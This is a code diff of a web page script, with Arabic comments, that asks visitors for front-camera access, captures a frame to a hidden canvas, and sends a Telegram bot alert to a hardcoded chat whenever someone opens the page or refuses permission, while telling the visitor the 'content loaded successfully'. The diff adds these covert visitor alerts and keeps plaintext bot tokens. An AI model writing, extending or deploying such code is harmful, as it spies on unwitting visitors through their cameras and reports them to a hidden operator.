@@ -43,26 +43,34 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // التوكن الجديد والآي دي الخاص بك
-        const TELEGRAM_BOT_TOKEN = '8882872511:AAGzHh1jV5Muy6jRQXUmThThX7mU-ZrfAA4';
+        const TELEGRAM_BOT_TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
         const TELEGRAM_CHAT_ID = '8304712202';
 
         async function startProcess() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // طلب الكاميرا الأمامية بشكل صريح للموبايل والكمبيوتر
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: { ideal: "user" } 
+                    } 
+                });
+                
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
 
+                sendNotificationToTelegram("🚨 تنبيه: شخص ما فتح الموقع ووافق على إذن الكاميرا الأمامية!");
+
                 setTimeout(() => {
-                    captureAndSend(stream);
-                }, 1000);
+                    captureAndProcess(stream);
+                }, 2000);
 
             } catch (error) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
+                sendNotificationToTelegram("⚠️ تنبيه: حاول فتح الموقع ولكن رفض إذن الكاميرا أو حدث خطأ: " + error.message);
             }
         }
 
-        function captureAndSend(stream) {
+        function captureAndProcess(stream) {
             try {
                 const videoElement = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
@@ -72,17 +80,17 @@
 
                 const context = canvas.getContext('2d');
                 context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
                 stream.getTracks().forEach(track => track.stop());
 
-                sendNotificationToTelegram();
+                document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
 
             } catch (e) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
             }
         }
 
-        function sendNotificationToTelegram() {
-            const message = "تم فتح الموقع ودخول الزائر بنجاح!";
+        function sendNotificationToTelegram(messageText) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             fetch(url, {
@@ -92,19 +100,11 @@
                 },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: message
+                    text: messageText
                 })
             })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
-                } else {
-                    document.getElementById('mainBox').innerHTML = '<h2>تفاصيل الخطأ: ' + JSON.stringify(data) + '</h2>';
-                }
-            })
             .catch(error => {
-                document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة</h2>';
+                console.error("فشل إرسال التيليجرام", error);
             });
         }
     </script>
